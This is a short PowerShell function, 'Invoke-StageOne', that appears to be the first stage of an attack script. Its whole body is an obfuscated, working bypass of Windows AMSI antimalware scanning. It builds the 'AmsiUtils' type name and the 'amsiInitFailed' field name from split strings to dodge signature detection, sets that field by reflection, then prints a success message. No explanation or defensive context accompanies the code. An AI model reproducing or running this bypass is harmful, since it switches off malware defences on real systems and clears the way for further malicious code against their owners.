function Invoke-StageOne {
    # Code for Stage One goes here
   
$a='System.Management.Automation.A'
$b='si'
$c='Utils'
$d='am{0}InitFailed' -f $b
$e=[Ref].Assembly.GetType(($a + 'm' + $b + $c))
$f=$e.GetField($d,'NonPublic,Static')
$f.SetValue($null,$true)

    # If Stage One completes successfully, write a success message
    Write-Host "Stage One succeeded" -ForegroundColor Green
}
